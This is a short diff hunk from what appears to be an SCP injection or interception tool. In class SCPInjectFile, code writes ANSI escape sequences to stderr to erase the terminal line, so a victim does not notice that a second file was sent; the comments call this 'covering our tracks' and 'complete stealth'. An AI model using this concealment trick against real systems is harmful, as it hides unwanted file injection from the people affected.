@@ -83,5 +83,5 @@ class SCPInjectFile(SCPForwarder):
         # to stderr, even if it contains ANSI escape sequences. We can send
         # ANSI codes that clear the current line to hide the fact that a second
         # file was transmitted..
-        logging.debug('Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K')
+        # Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
         self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
